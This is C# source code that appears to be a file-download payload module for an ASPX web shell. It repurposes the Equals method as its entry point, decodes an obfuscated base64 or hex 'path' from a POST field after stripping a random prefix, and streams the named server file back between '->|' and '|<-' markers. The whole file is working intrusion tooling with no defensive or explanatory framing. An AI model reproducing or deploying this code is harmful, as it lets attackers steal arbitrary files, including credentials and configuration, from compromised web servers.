using System;
using System.IO;
using System.Text;
using System.Web;
using System.Web.UI;

public class DownloadFile
{
    public HttpRequest Request;
    public HttpResponse Response;
    public String encoder;
    public String decoder;
    public String cs;
    public String randomPrefix;
    public String tag_s;
    public String tag_e;


    public override bool Equals(object obj)
    {
        Page page = (Page) obj;
        this.Response = page.Response;
        this.Request = page.Request;
        this.cs = "UTF-8";
        this.encoder = "base64";
        this.decoder = "";
        this.randomPrefix = "2";
        tag_s = "->|";
        tag_e = "|<-";
        this.Response.Charset = cs;
        String result = "";
        try
        {
            String path = decode(this.Request.Form["path"]);
            this.DownloadFileCode(path);
        }
        catch (Exception e)
        {
            result = "ERROR:// " + e.Message;
        }

        this.Response.Write(tag_s + asoutput(result) + tag_e);
        return true;
    }

    public void DownloadFileCode(String path)
    {
        this.Response.Clear();
        this.Response.Write(tag_s);
        this.Response.WriteFile(path);
        this.Response.Write(tag_e);
    }

    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2),
                System.Globalization.NumberStyles.HexNumber))));
        }

        return sb.ToString();
    }

    public String decode(String src)
    {
        int prefixlen = 0;
        try
        {
            prefixlen = Int32.Parse(randomPrefix);
            src = src.Substring(prefixlen);
        }
        catch (Exception e)
        {
        }

        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                {
                    ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                    break;
                }
                case "hex":
                {
                    ret = HexAsciiConvert(src);
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }

    public String asoutput(String src)
    {
        String ret;
        try
        {
            switch (decoder)
            {
                case "base64":
                {
                    ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }
}